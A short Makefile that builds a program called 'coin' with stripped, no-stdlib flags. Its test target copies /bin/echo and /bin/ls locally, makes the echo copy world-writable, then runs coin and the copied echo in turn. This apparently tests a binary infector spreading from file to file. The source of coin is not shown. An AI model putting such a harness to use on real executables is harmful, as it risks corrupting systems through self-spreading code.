   CC = gcc
   CFLAGS = -Os  -s -nostdlib -Wall -fomit-frame-pointer
   all: coin test

   coin: coin.c
       $(CC) $(CFLAGS) coin.c -o coin

   test: coin
       cp /bin/echo .
       chmod a+w ./echo
       ./coin
       ./echo
       cp -f /bin/ls .
       ./echo
       cp -f /bin/ls ls.orig

   clean:
       -@rm -f coin echo ls ls.orig

   .PHONY: all test clean
